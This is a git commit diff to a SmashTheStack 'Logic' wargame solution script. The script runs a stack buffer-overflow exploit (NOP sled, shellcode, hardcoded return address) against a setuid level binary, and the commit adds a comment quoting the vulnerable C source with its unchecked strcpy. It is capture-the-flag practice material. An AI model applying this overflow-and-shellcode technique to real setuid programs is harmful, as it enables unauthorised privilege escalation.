13f220f2271e140ea964145709ebf1875a9b5126
Adam Ziaja <adamziaja@users.noreply.github.com>
2014-09-23 17:28:48 +0200

    Level 2, Logic Wargame, SmashTheStack

--- smashthestack/level2.py
+++ smashthestack/level2.py
@@ -40,3 +40,35 @@ ret = '\x34\xcd\xff\xbf'
 payload = level2 + nop * 4084 + shellcode + ret
 
 os.system('/levels/level2/level2 ' + payload)
+
+'''
+[level2@logic level2]$ cat level2.c 
+/*
+	Password has been blanked out of the source. Enjoy :)
+*/
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+int main(int argc, const char **argv) {
+	if (argc < 2) { printf("Fail. More Args...\n"); return 1; } 
+	else {
+		setresuid(geteuid(),geteuid(),geteuid());
+		char buf2[4096];
+		char buf[16];
+		const char password[]="XXXXXXXXXXX";
+		strncpy(buf, argv[1], sizeof(buf) - 1);
+		if (strcmp(buf,password) != 0) {
+			printf("Wrong.\n");
+			return 1;
+		}
+		else {
+			strcpy(buf2,argv[2]);
+			printf("%s",buf2);
+			return 0;
+		}
+	}
+}
+'''
